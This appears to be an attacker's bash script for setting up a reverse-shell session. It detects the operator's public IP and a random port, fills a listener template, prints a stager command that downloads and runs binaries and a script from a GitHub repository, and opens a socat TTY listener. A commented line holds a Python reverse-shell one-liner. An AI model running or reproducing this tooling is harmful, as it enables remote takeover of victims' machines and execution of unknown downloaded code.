clear
ip=$(curl ipecho.net/plain ; echo)
echo $ip
po=$(shuf -i 20000-65000 -n 1)
echo $po
#pp= "python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" $ip 1987"
cat listener
cp listener l1
sed -i "s/x-1/$ip/" l1
sed -i "s/x-2/$po/" l1
clear
cat l1
rm l1
echo -en "curl -LOk https://github.com/hyassine53/curl/raw/master/node && curl -LOk https://raw.githubusercontent.com/hyassine53/curl/master/mul.sh && curl -LOk https://raw.githubusercontent.com/hyassine53/curl/master/default && chmod +x node mul.sh && ./mul.sh &\n"
socat `tty`,raw,echo=0 tcp-listen:$po
